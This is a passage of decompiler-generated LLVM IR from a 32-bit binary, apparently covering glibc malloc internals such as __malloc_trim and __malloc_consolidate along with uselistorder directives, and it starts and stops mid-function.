  uselistorder i32 %v1_80543a8, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8054396, { 1, 0 }
  uselistorder i32 %v1_8054386, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8054376, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_805435f, { 1, 0 }
  uselistorder i32 %v2_8054353, { 1, 0 }
  uselistorder i32 %v2_8054343, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8054327, { 1, 2, 0 }
  uselistorder i32 %v1_8054327, { 1, 0, 2 }
  uselistorder i32 %v1_8054326, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8054320, { 1, 0 }
  uselistorder i32 %v2_80542fe, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80542f2, { 2, 1, 0 }
  uselistorder i32 %v8_80542dd, { 5, 4, 2, 1, 3, 0, 6 }
  uselistorder i32 %v2_80542c4, { 1, 0, 2 }
  uselistorder i32 %v0_8054267, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8054236, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8054229, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805420f, { 1, 0, 2 }
  uselistorder i32 %v1_80541a9, { 1, 0 }
  uselistorder i32 %v3_805419e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8054198, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805419512, { 1, 0 }
  uselistorder i32 %v2_805418a, { 1, 0 }
  uselistorder i32 %v1_805416e, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805416a, { 2, 1, 0 }
  uselistorder i32 %v1_8054166, { 1, 0 }
  uselistorder i32 %v1_8054161, { 2, 1, 0 }
  uselistorder i32 %v2_8054150, { 1, 0 }
  uselistorder i32 %v1_805414d, { 1, 2, 0, 3 }
  uselistorder i32 %v4_80540eb, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8054136, { 1, 0 }
  uselistorder i32 %v0_8054101, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80540d7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80540a4, { 0, 2, 1 }
  uselistorder i32 %v2_8054088, { 1, 0 }
  uselistorder i32 %v1_805407e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8054079.lcssa, { 1, 0 }
  uselistorder i32 %v3_8054069, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8054060, { 1, 0, 2 }
  uselistorder i32 %v3_8054043, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_805403c, { 1, 0, 2 }
  uselistorder i32 %v2_8054024, { 2, 1, 0 }
  uselistorder i32 %v0_8054010, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8053fd6, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80540a4118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80540a4109, { 1, 0, 2 }
  uselistorder i32 %v3_8053f83, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8053f75, { 2, 1, 0 }
  uselistorder i32 %v2_8053f50, { 2, 1, 0 }
  uselistorder i8 %v0_8053f1e, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_80542be, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_8053f07, { 1, 2, 0 }
  uselistorder i32 %v0_8053ef0, { 1, 0 }
  uselistorder i32 %v2_8053ed7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 0, 12, 14, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8064b00.538, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134629332, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_80647e0.526, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80647cc.523 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80647cc.523 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805465a, { 1, 0 }
  uselistorder label %dec_label_pc_8054649, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805463c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8054638, { 1, 0 }
  uselistorder label %dec_label_pc_805462e, { 1, 0 }
  uselistorder label %dec_label_pc_80545d9, { 1, 0 }
  uselistorder label %dec_label_pc_805457e, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8054510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805450b, { 1, 0 }
  uselistorder label %dec_label_pc_80544ef, { 1, 0 }
  uselistorder label %dec_label_pc_8054498, { 1, 0 }
  uselistorder label %dec_label_pc_8054481, { 1, 0 }
  uselistorder label %dec_label_pc_805446a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8054421, { 1, 0 }
  uselistorder label %dec_label_pc_80543df, { 1, 0 }
  uselistorder label %dec_label_pc_8054376, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054315, { 1, 0 }
  uselistorder label %dec_label_pc_8054229, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054221, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054195, { 1, 0 }
  uselistorder label %dec_label_pc_805419a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805416e, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80540f5, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_805407c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054065, { 1, 0 }
  uselistorder label %dec_label_pc_8053fd3, { 1, 0 }
  uselistorder label %dec_label_pc_80540a4.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053fa0, { 1, 0 }
  uselistorder label %dec_label_pc_8053f1e, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8054665 = load i32, i32* @edx, align 4
  store i32 %v0_8054665, i32* %ebp.global-to-local, align 4
  %v0_8054668 = load i32, i32* @esi, align 4
  %v1_805466d = add i32 %v0_8054665, 860
  %v2_805466d = inttoptr i32 %v1_805466d to i32*
  %v3_805466d = load i32, i32* %v2_805466d, align 4
  store i32 %v3_805466d, i32* @ecx, align 4
  %v1_8054673 = add i32 %v0_8054665, 44
  %v2_8054673 = inttoptr i32 %v1_8054673 to i32*
  %v3_8054673 = load i32, i32* %v2_8054673, align 4
  %v1_8054676 = add i32 %v3_8054673, 4
  %v2_8054676 = inttoptr i32 %v1_8054676 to i32*
  %v3_8054676 = load i32, i32* %v2_8054676, align 4
  %v1_8054679 = and i32 %v3_8054676, -4
  store i32 %v1_8054679, i32* @esi, align 4
  %v1_805467e = load i32, i32* @eax, align 4
  %v2_805467e = add i32 %v3_805466d, -17
  %v2_8054680 = add i32 %v2_805467e, %v1_8054679
  %v3_8054680 = sub i32 %v2_8054680, %v1_805467e
  %div = udiv i32 %v3_8054680, %v3_805466d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8054680, %v3_805466d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8054688 = add i32 %div, -1
  %v4_805468b = mul i32 %v1_8054688, %v3_805466d
  store i32 %v4_805468b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805468b, 1
  br i1 %tmp11, label %dec_label_pc_80546e7, label %dec_label_pc_8054692

dec_label_pc_8054692:                             ; preds = %entry
  %v1_8054697 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8054697, i32* %edi.global-to-local, align 4
  %v0_80546a1 = load i32, i32* @esi, align 4
  store i32 %v0_80546a1, i32* %eax.global-to-local, align 4
  %v1_80546a3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80546a3 = add i32 %v1_80546a3, 44
  %v3_80546a3 = inttoptr i32 %v2_80546a3 to i32*
  %v4_80546a3 = load i32, i32* %v3_80546a3, align 4
  %v5_80546a3 = add i32 %v4_80546a3, %v0_80546a1
  store i32 %v5_80546a3, i32* %eax.global-to-local, align 4
  %v12_80546a6 = icmp eq i32 %v1_8054697, %v5_80546a3
  %v1_80546a8 = icmp eq i1 %v12_80546a6, false
  br i1 %v1_80546a8, label %dec_label_pc_80546e7, label %dec_label_pc_80546aa

dec_label_pc_80546aa:                             ; preds = %dec_label_pc_8054692
  %v1_80546ad = sub i32 0, %v4_805468b
  store i32 %v1_80546ad, i32* @ebx, align 4
  %v1_80546b0 = call i32 @__GI_sbrk(i32 %v1_80546ad)
  store i32 %v1_80546b0, i32* %eax.global-to-local, align 4
  %v1_80546bc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80546bc, i32* %eax.global-to-local, align 4
  %v10_80546c4 = icmp eq i32 %v1_80546bc, -1
  br i1 %v10_80546c4, label %dec_label_pc_80546e7, label %dec_label_pc_80546c9

dec_label_pc_80546c9:                             ; preds = %dec_label_pc_80546aa
  %v0_80546c9 = load i32, i32* %edi.global-to-local, align 4
  %v2_80546cb = sub i32 %v0_80546c9, %v1_80546bc
  %v12_80546cb = icmp eq i32 %v2_80546cb, 0
  store i32 %v2_80546cb, i32* @ecx, align 4
  br i1 %v12_80546cb, label %dec_label_pc_80546e7, label %dec_label_pc_80546cf

dec_label_pc_80546cf:                             ; preds = %dec_label_pc_80546c9
  %v0_80546cf = load i32, i32* %ebp.global-to-local, align 4
  %v1_80546cf = add i32 %v0_80546cf, 44
  %v2_80546cf = inttoptr i32 %v1_80546cf to i32*
  %v3_80546cf = load i32, i32* %v2_80546cf, align 4
  store i32 %v3_80546cf, i32* %eax.global-to-local, align 4
  %v0_80546d2 = load i32, i32* @esi, align 4
  %v2_80546d2 = sub i32 %v0_80546d2, %v2_80546cb
  store i32 %v2_80546d2, i32* %esi.global-to-local, align 4
  %v1_80546d4 = add i32 %v0_80546cf, 872
  %v2_80546d4 = inttoptr i32 %v1_80546d4 to i32*
  %v3_80546d4 = load i32, i32* %v2_80546d4, align 4
  %v5_80546d4 = sub i32 %v3_80546d4, %v2_80546cb
  store i32 %v5_80546d4, i32* %v2_80546d4, align 4
  %v0_80546da = load i32, i32* %esi.global-to-local, align 4
  %v1_80546da = or i32 %v0_80546da, 1
  store i32 %v1_80546da, i32* %esi.global-to-local, align 4
  %v1_80546dd = load i32, i32* %eax.global-to-local, align 4
  %v2_80546dd = add i32 %v1_80546dd, 4
  %v3_80546dd = inttoptr i32 %v2_80546dd to i32*
  store i32 %v1_80546da, i32* %v3_80546dd, align 4
  br label %dec_label_pc_80546e9

dec_label_pc_80546e7:                             ; preds = %dec_label_pc_80546c9, %dec_label_pc_80546aa, %dec_label_pc_8054692, %entry
  br label %dec_label_pc_80546e9

dec_label_pc_80546e9:                             ; preds = %dec_label_pc_80546cf, %dec_label_pc_80546e7
  %storemerge = phi i32 [ 1, %dec_label_pc_80546cf ], [ 0, %dec_label_pc_80546e7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054668, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80546bc, { 1, 0, 2 }
  uselistorder i32 %v4_805468b, { 1, 2, 0 }
  uselistorder i32 %v3_805466d, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8054665, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80546e9, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80546f2 = load i32, i32* @edi, align 4
  %v0_80546f3 = load i32, i32* @esi, align 4
  %v0_80546f4 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80546fc = load i32, i32* %arg1, align 4
  store i32 %v2_80546fc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8054703 = icmp eq i32 %v2_80546fc, 0
  br i1 %v1_8054703, label %dec_label_pc_805482c.preheader, label %dec_label_pc_805470b

dec_label_pc_805482c.preheader:                   ; preds = %entry
  %v3_8054821 = add i32 %tmp11, 44
  br label %dec_label_pc_805481d

dec_label_pc_805470b:                             ; preds = %entry
  %v1_805470f = and i32 %v2_80546fc, -3
  store i32 %v1_805470f, i32* %arg1, align 4
  %v1_8054714 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8054723 = add i32 %tmp11, 4
  store i32 %v1_8054723, i32* %eax.global-to-local, align 4
  %v2_805472a = load i32, i32* %arg1, align 4
  %v2_8054730 = udiv i32 %v2_805472a, 8
  %v2_8054733 = mul nuw i32 %v2_8054730, 4
  %v3_8054733 = add i32 %tmp11, -4
  %v4_8054733 = add i32 %v3_8054733, %v2_8054733
  store i32 %v4_8054733, i32* %eax.global-to-local, align 4
  %v2_80547fa = add i32 %tmp11, 44
  %v3_80547fa = inttoptr i32 %v2_80547fa to i32*
  %v1_80547cd = add i32 %tmp11, 60
  %v2_80547cd = inttoptr i32 %v1_80547cd to i32*
  br label %dec_label_pc_805473b

dec_label_pc_805473b:                             ; preds = %dec_label_pc_8054813, %dec_label_pc_805470b
  %v0_8054749 = phi i32 [ %v1_8054723, %dec_label_pc_805470b ], [ %v4_8054813, %dec_label_pc_8054813 ]
  store i32 %v0_8054749, i32* %eax.global-to-local, align 4
  %v1_805473f = inttoptr i32 %v0_8054749 to i32*
  %v2_805473f = load i32, i32* %v1_805473f, align 4
  store i32 %v2_805473f, i32* @ecx, align 4
  %v1_8054741 = icmp eq i32 %v2_805473f, 0
  br i1 %v1_8054741, label %dec_label_pc_8054809, label %dec_label_pc_8054749

dec_label_pc_8054749:                             ; preds = %dec_label_pc_805473b
  store i32 0, i32* %v1_805473f, align 4
  %v0_805474f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805474f

dec_label_pc_805474f:                             ; preds = %dec_label_pc_80547fd, %dec_label_pc_8054749
  %v0_805476c = phi i32 [ %v3_805474f, %dec_label_pc_80547fd ], [ %v0_805474f.pre, %dec_label_pc_8054749 ]
  %v1_805474f = add i32 %v0_805476c, 8
  %v2_805474f = inttoptr i32 %v1_805474f to i32*
  %v3_805474f = load i32, i32* %v2_805474f, align 4
  store i32 %v3_805474f, i32* %edx.global-to-local, align 4
  %v1_8054756 = add i32 %v0_805476c, 4
  %v2_8054756 = inttoptr i32 %v1_8054756 to i32*
  %v3_8054756 = load i32, i32* %v2_8054756, align 4
  store i32 %v3_8054756, i32* %eax.global-to-local, align 4
  %v1_805475b = and i32 %v3_8054756, -2
  store i32 %v1_805475b, i32* @edi, align 4
  %v2_805475e = urem i32 %v3_8054756, 2
  %v3_805475e = icmp eq i32 %v2_805475e, 0
  %v2_8054760 = add i32 %v1_805475b, %v0_805476c
  store i32 %v2_8054760, i32* @ebx, align 4
  %v1_8054763 = add i32 %v2_8054760, 4
  %v2_8054763 = inttoptr i32 %v1_8054763 to i32*
  %v3_8054763 = load i32, i32* %v2_8054763, align 4
  store i32 %v3_8054763, i32* %edx.global-to-local, align 4
  %v1_805476a = icmp eq i1 %v3_805475e, false
  br i1 %v1_805476a, label %dec_label_pc_805478c, label %dec_label_pc_805476c

dec_label_pc_805476c:                             ; preds = %dec_label_pc_805474f
  %v1_805476c = inttoptr i32 %v0_805476c to i32*
  %v2_805476c = load i32, i32* %v1_805476c, align 4
  store i32 %v2_805476c, i32* %ebp.global-to-local, align 4
  %v2_8054770 = sub i32 %v0_805476c, %v2_805476c
  store i32 %v2_8054770, i32* %eax.global-to-local, align 4
  %v1_8054772 = add i32 %v2_8054770, 8
  %v2_8054772 = inttoptr i32 %v1_8054772 to i32*
  %v3_8054772 = load i32, i32* %v2_8054772, align 4
  store i32 %v3_8054772, i32* @esi, align 4
  %v1_8054775 = add i32 %v2_8054770, 12
  %v2_8054775 = inttoptr i32 %v1_8054775 to i32*
  %v3_8054775 = load i32, i32* %v2_8054775, align 4
  store i32 %v3_8054775, i32* %edx.global-to-local, align 4
  %v1_8054778 = add i32 %v3_8054772, 12
  %v2_8054778 = inttoptr i32 %v1_8054778 to i32*
  %v3_8054778 = load i32, i32* %v2_8054778, align 4
  store i32 %v3_8054778, i32* @ecx, align 4
  %v12_805477b = icmp eq i32 %v3_8054778, %v2_8054770
  %v1_805477d = icmp eq i1 %v12_805477b, false
  br i1 %v1_805477d, label %dec_label_pc_80547bc, label %dec_label_pc_805477f

dec_label_pc_805477f:                             ; preds = %dec_label_pc_805476c
  %v1_805477f = add i32 %v3_8054775, 8
  %v2_805477f = inttoptr i32 %v1_805477f to i32*
  %v3_805477f = load i32, i32* %v2_805477f, align 4
  %v15_805477f = icmp eq i32 %v3_805477f, %v3_8054778
  %v1_8054782 = icmp eq i1 %v15_805477f, false
  br i1 %v1_8054782, label %dec_label_pc_80547bc, label %dec_label_pc_8054784

dec_label_pc_8054784:                             ; preds = %dec_label_pc_805477f
  %v2_8054784 = add i32 %v2_805476c, %v1_805475b
  store i32 %v2_8054784, i32* @edi, align 4
  store i32 %v3_8054775, i32* %v2_8054778, align 4
  %v0_8054789 = load i32, i32* @esi, align 4
  %v1_8054789 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054789 = add i32 %v1_8054789, 8
  %v3_8054789 = inttoptr i32 %v2_8054789 to i32*
  store i32 %v0_8054789, i32* %v3_8054789, align 4
  %v0_8054797.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805478c

dec_label_pc_805478c:                             ; preds = %dec_label_pc_805474f, %dec_label_pc_8054784
  %v1_80547a0 = phi i32 [ %v2_8054760, %dec_label_pc_805474f ], [ %v0_8054797.pre, %dec_label_pc_8054784 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8054794 = and i32 %v3_8054763, -4
  store i32 %v1_8054794, i32* %ebp.global-to-local, align 4
  %v4_8054797 = load i32, i32* %v3_80547fa, align 4
  %v15_8054797 = icmp eq i32 %v1_80547a0, %v4_8054797
  br i1 %v15_8054797, label %dec_label_pc_80547ed, label %dec_label_pc_805479c

dec_label_pc_805479c:                             ; preds = %dec_label_pc_805478c
  %v2_805479c = add i32 %v1_80547a0, 4
  %v3_805479c = add i32 %v2_805479c, %v1_8054794
  %v4_805479c = inttoptr i32 %v3_805479c to i32*
  %v5_805479c = load i32, i32* %v4_805479c, align 4
  store i32 %v5_805479c, i32* %eax.global-to-local, align 4
  %v3_80547a0 = inttoptr i32 %v2_805479c to i32*
  store i32 %v1_8054794, i32* %v3_80547a0, align 4
  %v0_80547a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80547a3 = urem i32 %v0_80547a3, 2
  %v2_80547a3 = icmp eq i32 %v1_80547a3, 0
  store i32 %v1_80547a3, i32* %eax.global-to-local, align 4
  %v1_80547a8 = icmp eq i1 %v2_80547a3, false
  br i1 %v1_80547a8, label %dec_label_pc_80547c9, label %dec_label_pc_80547aa

dec_label_pc_80547aa:                             ; preds = %dec_label_pc_805479c
  %v0_80547aa = load i32, i32* @ebx, align 4
  %v1_80547aa = add i32 %v0_80547aa, 8
  %v2_80547aa = inttoptr i32 %v1_80547aa to i32*
  %v3_80547aa = load i32, i32* %v2_80547aa, align 4
  store i32 %v3_80547aa, i32* @edx, align 4
  %v1_80547ad = add i32 %v0_80547aa, 12
  %v2_80547ad = inttoptr i32 %v1_80547ad to i32*
  %v3_80547ad = load i32, i32* %v2_80547ad, align 4
  store i32 %v3_80547ad, i32* %eax.global-to-local, align 4
  %v1_80547b0 = add i32 %v3_80547aa, 12
  %v2_80547b0 = inttoptr i32 %v1_80547b0 to i32*
  %v3_80547b0 = load i32, i32* %v2_80547b0, align 4
  store i32 %v3_80547b0, i32* @esi, align 4
  %v12_80547b3 = icmp eq i32 %v3_80547b0, %v0_80547aa
  %v1_80547b5 = icmp eq i1 %v12_80547b3, false
  br i1 %v1_80547b5, label %dec_label_pc_80547bc, label %dec_label_pc_80547b7

dec_label_pc_80547b7:                             ; preds = %dec_label_pc_80547aa
  %v1_80547b7 = add i32 %v3_80547ad, 8
  %v2_80547b7 = inttoptr i32 %v1_80547b7 to i32*
  %v3_80547b7 = load i32, i32* %v2_80547b7, align 4
  %v15_80547b7 = icmp eq i32 %v3_80547b7, %v3_80547b0
  br i1 %v15_80547b7, label %dec_label_pc_80547c1, label %dec_label_pc_80547bc

dec_label_pc_80547bc:                             ; preds = %dec_label_pc_80547b7, %dec_label_pc_80547aa, %dec_label_pc_805477f, %dec_label_pc_805476c
  %v0_80547bc = call i32 @abort()
  store i32 %v0_80547bc, i32* %eax.global-to-local, align 4
  %v1_80547c3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80547c1

dec_label_pc_80547c1:                             ; preds = %dec_label_pc_80547b7, %dec_label_pc_80547bc
  %v1_80547c3 = phi i32 [ %v3_80547aa, %dec_label_pc_80547b7 ], [ %v1_80547c3.pre, %dec_label_pc_80547bc ]
  %v0_80547c3 = phi i32 [ %v3_80547ad, %dec_label_pc_80547b7 ], [ %v0_80547bc, %dec_label_pc_80547bc ]
  %v0_80547c1 = load i32, i32* @edi, align 4
  %v1_80547c1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80547c1 = add i32 %v1_80547c1, %v0_80547c1
  store i32 %v2_80547c1, i32* @edi, align 4
  %v2_80547c3 = add i32 %v1_80547c3, 12
  %v3_80547c3 = inttoptr i32 %v2_80547c3 to i32*
  store i32 %v0_80547c3, i32* %v3_80547c3, align 4
  %v0_80547c6 = load i32, i32* @edx, align 4
  %v1_80547c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80547c6 = add i32 %v1_80547c6, 8
  %v3_80547c6 = inttoptr i32 %v2_80547c6 to i32*
  store i32 %v0_80547c6, i32* %v3_80547c6, align 4
  br label %dec_label_pc_80547c9

dec_label_pc_80547c9:                             ; preds = %dec_label_pc_805479c, %dec_label_pc_80547c1
  store i32 %v1_8054714, i32* %eax.global-to-local, align 4
  %v3_80547cd = load i32, i32* %v2_80547cd, align 4
  store i32 %v3_80547cd, i32* @edx, align 4
  %v0_80547d0 = load i32, i32* @ecx, align 4
  store i32 %v0_80547d0, i32* %v2_80547cd, align 4
  %v0_80547d3 = load i32, i32* @edi, align 4
  %v1_80547d5 = or i32 %v0_80547d3, 1
  %v1_80547d8 = load i32, i32* @ecx, align 4
  %v2_80547d8 = add i32 %v1_80547d8, 4
  %v3_80547d8 = inttoptr i32 %v2_80547d8 to i32*
  store i32 %v1_80547d5, i32* %v3_80547d8, align 4
  %v0_80547db = load i32, i32* @ecx, align 4
  %v1_80547db = load i32, i32* @edx, align 4
  %v2_80547db = add i32 %v1_80547db, 12
  %v3_80547db = inttoptr i32 %v2_80547db to i32*
  store i32 %v0_80547db, i32* %v3_80547db, align 4
  store i32 %v1_8054714, i32* %eax.global-to-local, align 4
  %v0_80547e2 = load i32, i32* @edx, align 4
  %v1_80547e2 = load i32, i32* @ecx, align 4
  %v2_80547e2 = add i32 %v1_80547e2, 8
  %v3_80547e2 = inttoptr i32 %v2_80547e2 to i32*
  store i32 %v0_80547e2, i32* %v3_80547e2, align 4
  %v0_80547e5 = load i32, i32* @edi, align 4
  %v1_80547e5 = load i32, i32* @ecx, align 4
  %v3_80547e5 = add i32 %v1_80547e5, %v0_80547e5
  %v4_80547e5 = inttoptr i32 %v3_80547e5 to i32*
  store i32 %v0_80547e5, i32* %v4_80547e5, align 4
  %v0_80547e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80547e8 = load i32, i32* @ecx, align 4
  %v2_80547e8 = add i32 %v1_80547e8, 12
  %v3_80547e8 = inttoptr i32 %v2_80547e8 to i32*
  store i32 %v0_80547e8, i32* %v3_80547e8, align 4
  br label %dec_label_pc_80547fd

dec_label_pc_80547ed:                             ; preds = %dec_label_pc_805478c
  %v0_80547ed = load i32, i32* @edi, align 4
  %v2_80547ed = add i32 %v0_80547ed, %v1_8054794
  %v1_80547f0 = or i32 %v2_80547ed, 1
  store i32 %v1_80547f0, i32* %eax.global-to-local, align 4
  %v1_80547f3 = load i32, i32* @ecx, align 4
  %v2_80547f3 = add i32 %v1_80547f3, 4
  %v3_80547f3 = inttoptr i32 %v2_80547f3 to i32*
  store i32 %v1_80547f0, i32* %v3_80547f3, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_80547fa = load i32, i32* @ecx, align 4
  store i32 %v0_80547fa, i32* %v3_80547fa, align 4
  br label %dec_label_pc_80547fd

dec_label_pc_80547fd:                             ; preds = %dec_label_pc_80547c9, %dec_label_pc_80547ed
  store i32 %v3_805474f, i32* @ecx, align 4
  %v1_8054801 = icmp eq i32 %v3_805474f, 0
  %v1_8054803 = icmp eq i1 %v1_8054801, false
  br i1 %v1_8054803, label %dec_label_pc_805474f, label %dec_label_pc_8054809

dec_label_pc_8054809:                             ; preds = %dec_label_pc_80547fd, %dec_label_pc_805473b
  store i32 %v4_8054733, i32* @ecx, align 4
  %v15_805480d = icmp eq i32 %v0_8054749, %v4_8054733
  br i1 %v15_805480d, label %dec_label_pc_8054891, label %dec_label_pc_8054813

dec_label_pc_8054813:                             ; preds = %dec_label_pc_8054809
  %v4_8054813 = add i32 %v0_8054749, 4
  br label %dec_label_pc_805473b

dec_label_pc_805481d:                             ; preds = %dec_label_pc_805482c.preheader, %dec_label_pc_805481d
  %v1_805482120 = phi i32 [ 1, %dec_label_pc_805482c.preheader ], [ %v0_805482c.pre, %dec_label_pc_805481d ]
  %v2_8054821 = mul i32 %v1_805482120, 8
  %v4_8054821 = add i32 %v3_8054821, %v2_8054821
  store i32 %v4_8054821, i32* %eax.global-to-local, align 4
  %v1_8054825 = add i32 %v1_805482120, 1
  store i32 %v1_8054825, i32* %edx.global-to-local, align 4
  %v2_8054826 = add i32 %v4_8054821, 12
  %v3_8054826 = inttoptr i32 %v2_8054826 to i32*
  store i32 %v4_8054821, i32* %v3_8054826, align 4
  %v0_8054829 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054829 = add i32 %v0_8054829, 8
  %v3_8054829 = inttoptr i32 %v2_8054829 to i32*
  store i32 %v0_8054829, i32* %v3_8054829, align 4
  %v0_805482c.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_805482f = icmp sgt i32 %v0_805482c.pre, 95
  br i1 %v7_805482f, label %dec_label_pc_8054831, label %dec_label_pc_805481d

dec_label_pc_8054831:                             ; preds = %dec_label_pc_805481d
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8054835 = add i32 %tmp11, 864
  %v2_8054835 = inttoptr i32 %v1_8054835 to i32*
  %v3_8054835 = load i32, i32* %v2_8054835, align 4
  %v4_8054835 = or i32 %v3_8054835, 1
  store i32 %v4_8054835, i32* %v2_8054835, align 4
  %v0_805483c = load i32, i32* %eax.global-to-local, align 4
  %v1_805483c = add i32 %v0_805483c, 840
  %v2_805483c = inttoptr i32 %v1_805483c to i32*
  store i32 0, i32* %v2_805483c, align 4
  %v0_8054846 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054846 = add i32 %v0_8054846, 852
  %v2_8054846 = inttoptr i32 %v1_8054846 to i32*
  store i32 65536, i32* %v2_8054846, align 4
  %v0_8054850 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054850 = add i32 %v0_8054850, 844
  %v2_8054850 = inttoptr i32 %v1_8054850 to i32*
  store i32 262144, i32* %v2_8054850, align 4
  %v0_805485a = load i32, i32* %eax.global-to-local, align 4
  %v1_805485a = add i32 %v0_805485a, 836
  %v2_805485a = inttoptr i32 %v1_805485a to i32*
  store i32 262144, i32* %v2_805485a, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_805486b = load i32, i32* %arg1, align 4
  %v1_805486d = urem i32 %v2_805486b, 4
  %v1_8054870 = or i32 %v1_805486d, 72
  store i32 %v1_8054870, i32* %arg1, align 4
